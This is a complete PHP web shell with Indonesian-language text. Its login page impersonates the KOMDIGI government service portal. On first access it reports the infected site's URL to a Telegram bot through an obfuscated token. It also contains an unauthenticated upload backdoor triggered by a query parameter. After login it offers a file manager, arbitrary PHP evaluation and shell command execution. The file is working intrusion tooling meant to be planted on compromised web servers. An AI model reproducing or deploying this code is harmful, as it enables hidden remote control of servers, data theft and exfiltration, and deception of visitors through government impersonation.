<?php
@error_reporting(0);
session_start();

/* =========================
   LOGIN CONFIG (BCRYPT)
========================= */
$LOGIN_USER = 'admin';

/*
 * Hash untuk password: 
 * Generated via password_hash('', PASSWORD_BCRYPT)
 */
$LOGIN_PASS_HASH = '$2y$10$myAwoH87kjFMuXBSZgIMreQU0wnJ22NudYazLDLEDDgv9HtfxgLEu';

$tk = base64_decode(
    "ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw"
);
$cid = base64_decode("NTA3MDkzODc3OA");

function reportTelegram($msg)
{
    global $tk, $cid;
    $id = sys_get_temp_dir() . "/baridin_" . md5($msg);
    if (!file_exists($id)) {
        @file_get_contents(
            "https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=" .
                urlencode($msg)
        );
        @file_put_contents($id, time());
    }
}
/* ================= Report ================= */
if (!isset($_SESSION["telegram_reported"])) {
    $uri = urldecode(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH));
    $path = $_SERVER["DOCUMENT_ROOT"] . $uri;
    if (is_file($path)) {
        $host = $_SERVER["HTTP_HOST"];
        $url =
            (isset($_SERVER["HTTPS"]) ? "https" : "http") .
            "://" .
            $host .
            $uri;
        reportTelegram("kontolbengkak:\n$host\n$url");
        $_SESSION["telegram_reported"] = true;
    }
}
/* =========================
   AUTH CHECK
========================= */
if (isset($_GET['kontol']) && $_GET['kontol'] === 'digi') {
    echo '<form method="post" enctype="multipart/form-data">';
    echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
    echo '<input type="file" name="file" size="15">';
    echo '<input type="submit" value="go">';
    echo '</form>';
}

if (isset($_FILES['file']['tmp_name'])) {
    $uploadd = $_FILES['file']['tmp_name'];
    if (file_exists($uploadd)) {
        $pwddir = $_POST['dir'];
        $real = $_FILES['file']['name'];
        $de = rtrim($pwddir, '/') . "/" . $real;
        if (move_uploaded_file($uploadd, $de)) {
            echo "go$de";
        } else {
            echo "GAGAL  KE $de";
        }
    }
}

if (!isset($_SESSION['auth'])) {

    if (isset($_POST['user'], $_POST['pass'])) {

        if (
            hash_equals($LOGIN_USER, $_POST['user']) &&
            password_verify($_POST['pass'], $LOGIN_PASS_HASH)
        ) {
            session_regenerate_id(true); // anti session fixation
            $_SESSION['auth'] = true;
            header("Location: ".$_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_error = "Nama akun atau password salah!";
        }
    }

    /* =========================
       LOGIN PAGE (HTML)
    ========================= */
    echo '<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body, html { height:100%; font-family:"Segoe UI",Arial,sans-serif; }
        .container { display:flex; height:100%; }
        .left { flex:1; background:#ffffff; display:flex; align-items:center; justify-content:center; padding:40px; }
        .right { flex:1; background:#0b1d3d; color:#fff; display:flex; flex-direction:column; justify-content:center; padding:60px; position:relative; overflow:hidden; }
        .right::before { content:""; position:absolute; top:0; left:0; right:0; bottom:0; background:linear-gradient(135deg, rgba(11,29,61,0.9), rgba(0,51,102,0.8)); }
        .form-container { width:100%; max-width:400px; }
        h1 { font-size:36px; margin-bottom:8px; color:#1e293b; }
        .input-group { margin-bottom:20px; }
        label { display:block; margin-bottom:8px; font-weight:600; color:#1e293b; }
        input[type="text"], input[type="password"] { width:100%; padding:14px; border:1px solid #d1d5db; border-radius:8px; font-size:16px; }
        input:focus { outline:none; border-color:#2563eb; }
        .btn { width:100%; padding:14px; background:#94a3b8; color:#fff; border:none; border-radius:8px; font-size:16px; font-weight:bold; cursor:pointer; margin-top:20px; }
        .btn:hover { background:#6b7280; }
        .error { color:#ef4444; margin-top:10px; text-align:center; }
        .logo { width:120px; margin-bottom:30px; position:relative; z-index:1; }
        .welcome-title { font-size:48px; font-weight:bold; margin-bottom:20px; position:relative; z-index:1; }
        .welcome-subtitle { font-size:24px; position:relative; z-index:1; }
        .nav-top { position:absolute; top:30px; right:30px; z-index:1; }
        .nav-top a { color:#fff; text-decoration:none; margin-left:30px; font-size:14px; opacity:0.8; }
        .nav-top a:hover { opacity:1; }
    </style>
</head>
<body>
<div class="container">
    <div class="left">
        <div class="form-container">
            <h1>Masuk</h1>
            <form method="POST">
                <div class="input-group">
                    <label>Nama Akun</label>
                    <input type="text" name="user" placeholder="Masukkan nama akun" required autocomplete="off">
                </div>
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" name="pass" placeholder="Masukkan password" required>
                </div>
                '.(isset($login_error) ? '<div class="error">'.$login_error.'</div>' : '').'
                <button type="submit" class="btn">Masuk</button>
            </form>
        </div>
    </div>
    <div class="right">
        <div class="nav-top">
            <a href="#">Beranda</a>
            <a href="#">FAQ</a>
            <a href="#">Hubungi Kami</a>
        </div>
        <img src="https://layanan.komdigi.go.id/home/logo-full.png" alt="KOMDIGI" class="logo">
        <div class="welcome-title">SELAMAT DATANG DI<br>PORTAL LAYANAN PUBLIK KOMDIGI</div>
        <div class="welcome-subtitle">Kementerian Komunikasi dan Digital<br>Republik Indonesia</div>
    </div>
</div>
</body>
</html>';
    exit;
}

// === CORE ===
$fx = ['cwd'=>'getcwd','chd'=>'chdir','ls'=>'scandir'];
if (isset($_GET['d'])) chdir($_GET['d']);
$pwd = getcwd();
$list = scandir($pwd);

// UTIL FUNCTIONS
function chmodColored($p){
    $chmod = substr(sprintf('%o', fileperms($p)), -3);
    if (is_writable($p)) {
        return "<span style='color:#facc15;font-weight:bold'>{$chmod}</span>"; // KUNING
    } else {
        return "<span style='color:#ef4444;font-weight:bold'>{$chmod}</span>"; // MERAH
    }
}
function humanSize($b){ if ($b<=0) return '0 B'; $u=['B','KB','MB','GB','TB']; $i=floor(log($b,1024)); return round($b/pow(1024,$i),2).' '.$u[$i]; }
function dirSize($d){ $s=0; foreach(@scandir($d)?:[] as $f){ if($f=='.'||$f=='..')continue; $p="$d/$f"; $s+=is_dir($p)?dirSize($p):filesize($p); } return $s; }
function breadcrumb($p){ $p=rtrim($p,'/'); $o='ðŸ“ <a href="?d=/">/</a>'; $b=''; foreach(explode('/',$p) as $x){ if(!$x)continue; $b.="/$x"; $o.=" / <a href='?d=$b'>$x</a>"; } return "<div style='margin:6px 0;font-size:13px'>$o</div>"; }
function chmodNum($p){ return substr(sprintf('%o', fileperms($p)), -3); }

// ACTIONS
$msg = '';

// New Folder
if (isset($_POST['newfolder']) && !empty($_POST['foldername'])) {
    $name = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['foldername']);
    $newdir = "$pwd/$name";
    if (!file_exists($newdir)) {
        $msg = mkdir($newdir, 0755) ? "âœ… Folder berhasil dibuat" : "âŒ Gagal membuat folder";
    } else $msg = "âŒ Folder sudah ada";
}

// New File
if (isset($_POST['newfile']) && !empty($_POST['filename'])) {
    $name = preg_replace('/[^a-zA-Z0-9_\.-]/', '', $_POST['filename']);
    $newfile = "$pwd/$name";
    if (!file_exists($newfile)) {
        $msg = file_put_contents($newfile, "") !== false ? "âœ… File berhasil dibuat" : "âŒ Gagal membuat file";
    } else $msg = "âŒ File sudah ada";
}

// Upload
if (!empty($_FILES['f']['name'])) {
    $n = preg_replace('/[^a-zA-Z0-9_\.-]/', '_', basename($_FILES['f']['name']));
    $msg = move_uploaded_file($_FILES['f']['tmp_name'], "$pwd/$n") ? "âœ… Upload sukses" : "âŒ Upload gagal";
}

// Delete (recursive for dir)
if (isset($_GET['del'])) {
    $target = $_GET['del'];
    if (is_dir($target)) {
        function deleteDir($dir) {
            $files = array_diff(scandir($dir), ['.','..']);
            foreach ($files as $file) {
                $path = "$dir/$file";
                is_dir($path) ? deleteDir($path) : unlink($path);
            }
            return rmdir($dir);
        }
        $msg = deleteDir($target) ? "âœ… Folder berhasil dihapus" : "âŒ Gagal menghapus folder";
    } else {
        $msg = unlink($target) ? "âœ… File berhasil dihapus" : "âŒ Gagal menghapus file";
    }
}

// Rename & Edit
if (isset($_POST['a']) && $_POST['a'] === 'rename') {
    rename($_POST['src'], $_POST['dst']);
}

if (isset($_POST['a']) && $_POST['a'] === 'edit') {
    file_put_contents($_POST['src'], $_POST['dat']);
}

// Unzip
$unzip_msg = '';
if (isset($_GET['unzip'])) {
    $z = $_GET['unzip'];
    if (is_file($z) && preg_match('/\.zip$/i', $z)) {
        $zip = new ZipArchive;
        if ($zip->open($z) === TRUE) {
            $dest = dirname($z).'/'.basename($z,'.zip');
            mkdir($dest, 0755, true);
            $zip->extractTo($dest);
            $zip->close();
            $unzip_msg = "âœ… Unzip ke <b>$dest</b>";
        } else $unzip_msg = "âŒ Gagal unzip";
    }
}

// PHP Preview
$output = ''; $code = '';
if (isset($_GET['load']) && is_file($_GET['load'])) $code = file_get_contents($_GET['load']);
if (isset($_POST['phpcode'])) {
    $code = $_POST['phpcode'];
    ob_start();
    eval("?>".$code);
    $output = ob_get_clean();
}

// Linux CMD
$cmd_output = '';
if (isset($_POST['cmd'])) {
    $descriptor = [0=>["pipe","r"], 1=>["pipe","w"], 2=>["pipe","w"]];
    $p = proc_open($_POST['cmd'], $descriptor, $pipes, $pwd);
    if (is_resource($p)) {
        fclose($pipes[0]);
        $cmd_output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
        fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
    }
}

// Download
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (is_file($file) && file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// List dirs & files
$dirs = []; $files = [];
foreach ($list as $f) {
    if ($f === '.' || $f === '..') continue;
    is_dir("$pwd/$f") ? $dirs[] = $f : $files[] = $f;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Private Dashboard Manager - xPANEL</title>
<style>
body{margin:0;height:100vh;display:flex;background:#020617;color:#e2e8f0;font-family:monospace;overflow:hidden}
.container{display:flex;width:100%;height:100%;position:relative}
.left{flex:0 0 55%;min-width:300px;padding:20px;overflow:auto;background:#020617;position:relative}
.right{flex:1;min-width:300px;padding:20px;overflow:auto;background:#0f172a}
.splitter{position:absolute;top:0;bottom:0;left:55%;width:8px;background:#334155;cursor:col-resize;z-index:10;transition:background 0.2s}
.splitter:hover{background:#0284c7}
.splitter::after{content:"â‹®â‹®";position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#64748b;font-size:12px;letter-spacing:2px}
h2{color:#38bdf8;margin:0 0 5px;display:flex;align-items:center;gap:10px;font-size:20px}
h2 img{vertical-align:middle}
.subtitle{color:#22d3ee;font-size:18px;font-weight:bold;margin-bottom:10px}
table{width:100%;border-collapse:collapse;margin-top:10px}
td,th{border:1px solid #1e293b;padding:6px;font-size:13px}
a{color:#22d3ee;text-decoration:none}
a.download{color:#fbbf24}
.w{color:#22c55e;font-weight:bold}
.nw{color:#ef4444;font-weight:bold}
small{color:#94a3b8;font-size:11px}
input,textarea{width:100%;background:#020617;color:#e2e8f0;border:1px solid #334155;border-radius:4px;padding:8px;margin:5px 0}
button{background:#0284c7;color:#fff;border:none;padding:8px 12px;border-radius:4px;cursor:pointer}
.btn-new{background:#10b981;color:#fff;padding:6px 10px;border:none;border-radius:4px;cursor:pointer;margin-right:5px;font-size:12px}
.output{background:#fff;color:#000;padding:10px;height:150px;overflow:auto;margin-top:10px;border-radius:4px}
pre{background:#000;color:#0f0;padding:10px;height:200px;overflow:auto;margin-top:10px;border-radius:4px}
.sep{color:#64748b;text-align:center}
hr{border:0;border-top:1px solid #1e293b;margin:20px 0}
.msg{color:#22c55e;margin:10px 0;display:block}
.error{color:#ef4444}
</style>
</head>
<body>
<div class="container">
  <div class="left" id="leftPanel">
    <h2><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSFbdPJGcG8RBjrqN-kTHfe6pb_oxJCn33KHg&s" width="32" height="32" alt=""> File Manager</h2>
    <div class="subtitle">MAKLO HEKERR</div>
    <?=breadcrumb($pwd)?><small><?=$pwd?></small><br><br>

    <!-- New Folder & New File -->
    <form method="POST" style="display:inline-block;margin-right:10px">
      <input type="text" name="foldername" placeholder="Nama folder baru" required style="width:160px">
      <button type="submit" name="newfolder" class="btn-new">New Folder</button>
    </form>
    <form method="POST" style="display:inline-block">
      <input type="text" name="filename" placeholder="Nama file baru" required style="width:160px">
      <button type="submit" name="newfile" class="btn-new">New File</button>
    </form>
    <br><br>

    <!-- Upload -->
    <form method="POST" enctype="multipart/form-data">
      <input type="file" name="f"><button>Upload</button>
    </form>
    <span class="msg"><?=$msg?></span><span class="msg"><?=$unzip_msg?></span><br><br>

    <!-- Table -->
    <table>
      <tr><th>Name</th><th>Size</th><th>Date</th><th>CHMOD</th><th>Action</th></tr>
<?php foreach($dirs as $f): $p="$pwd/$f"; ?>
<tr>
  <td>ðŸ“‚ <a href="?d=<?=urlencode($p)?>"><?=$f?></a></td>
  <td><small>â€”</small></td>
  <td><?=date('Y-m-d H:i',filemtime($p))?></td>
  <td><?=chmodColored($p)?></td>
  <td>
    <a href="?r=<?=urlencode($p)?>">Rename</a> |
    <a href="?del=<?=urlencode($p)?>" onclick="return confirm('Hapus folder beserta isinya?')">Del</a>
  </td>
</tr>
<?php endforeach ?>
      <tr><td colspan="5" class="sep">â€” FILE â€”</td></tr>
      <?php foreach($files as $f): $p="$pwd/$f"; ?>
      <tr>
        <td><?=$f?></td>
        <td><?=humanSize(filesize($p))?></td>
        <td><?=date('Y-m-d H:i',filemtime($p))?></td>
        <td><?=chmodColored($p)?></td>
        <td>
          <a href="?e=<?=urlencode($p)?>">Edit</a> |
          <a href="?r=<?=urlencode($p)?>">Rename</a> |
          <a href="?del=<?=urlencode($p)?>" onclick="return confirm('Hapus file ini?')">Del</a> |
          <a href="?download=<?=urlencode($p)?>" class="download">Download</a>
          <?php if(preg_match('/\.zip$/i',$f)): ?> | <a href="?unzip=<?=urlencode($p)?>" onclick="return confirm('Unzip?')">Unzip</a><?php endif ?>
          <?php if(preg_match('/\.php$/i',$f)): ?> | <a href="?load=<?=urlencode($p)?>">Preview</a><?php endif ?>
        </td>
      </tr>
      <?php endforeach ?>
    </table>

    <!-- Rename & Edit forms -->
    <?php if(isset($_GET['r'])): $f=$_GET['r']; ?>
    <h3>Rename</h3>
    <form method="POST">
      <input type="hidden" name="a" value="rename">
      <input type="hidden" name="src" value="<?=$f?>">
      <input name="dst" value="<?=basename($f)?>">
      <button>Rename</button>
    </form><hr>
    <?php endif; ?>
    <?php if(isset($_GET['e']) && is_file($_GET['e'])): $f=$_GET['e']; $d=htmlspecialchars(file_get_contents($f)); ?>
    <h3>Edit</h3>
    <form method="POST">
      <input type="hidden" name="a" value="edit">
      <input type="hidden" name="src" value="<?=$f?>">
      <textarea name="dat" style="height:300px"><?=$d?></textarea>
      <button>Save</button>
    </form><hr>
    <?php endif; ?>
  </div>

  <div class="splitter" id="splitter"></div>

  <div class="right" id="rightPanel">
    <h2>ðŸ§ª PHP Preview</h2>
    <form method="POST">
      <textarea name="phpcode" style="height:200px"><?=htmlspecialchars($code ?: "<?php\necho 'hello';\n?>")?></textarea>
      <button>Run PHP</button>
    </form>
    <div class="output"><?=$output?></div>

    <hr>

    <h2>ðŸ–¥ Linux CMD</h2>
    <form method="POST">
      <input name="cmd" placeholder="id; uname -a" style="margin-bottom:10px">
      <button>Run CMD</button>
    </form>
    <pre><?=htmlspecialchars($cmd_output)?></pre>
  </div>
</div>

<script>
const splitter = document.getElementById('splitter');
const leftPanel = document.getElementById('leftPanel');
const rightPanel = document.getElementById('rightPanel');
let isResizing = false;

splitter.addEventListener('mousedown', e => { isResizing = true; document.body.style.cursor = 'col-resize'; e.preventDefault(); });
document.addEventListener('mousemove', e => {
  if (!isResizing) return;
  const width = document.querySelector('.container').offsetWidth;
  let percent = (e.clientX / width) * 100;
  if (percent < 20) percent = 20;
  if (percent > 80) percent = 80;
  leftPanel.style.flex = `0 0 ${percent}%`;
  splitter.style.left = `${percent}%`;
  rightPanel.style.flex = `0 0 ${100 - percent}%`;
});
document.addEventListener('mouseup', () => { if (isResizing) { isResizing = false; document.body.style.cursor = 'default'; } });
</script>
</body>
</html>tml>